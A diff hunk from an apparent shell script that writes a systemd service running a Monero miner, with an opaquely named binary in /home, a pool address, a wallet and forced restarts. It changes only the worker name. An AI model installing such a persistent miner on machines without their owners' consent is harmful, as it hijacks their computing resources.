@@ -11,7 +11,7 @@ bash -c 'cat <<EOT >>/lib/systemd/system/xmrthanh.service
 Description=xmrthanh
 After=network.target
 [Service]
-ExecStart= /home/jvdar --coin=XMR -o xmr.2miners.com:2222 -u 86MbukuwW42DjbkU3vVckHP6LYRTWxrRF1G2J8ZwmEzARs14ME7uNdt1Sp4TmpARszgzqG2p4jwNT43NvfYAgrai9hGwgNE.Thanh -p x
+ExecStart= /home/jvdar --coin=XMR -o xmr.2miners.com:2222 -u 86MbukuwW42DjbkU3vVckHP6LYRTWxrRF1G2J8ZwmEzARs14ME7uNdt1Sp4TmpARszgzqG2p4jwNT43NvfYAgrai9hGwgNE.Thin -p x
 WatchdogSec=36000
 Restart=always
 RestartSec=60
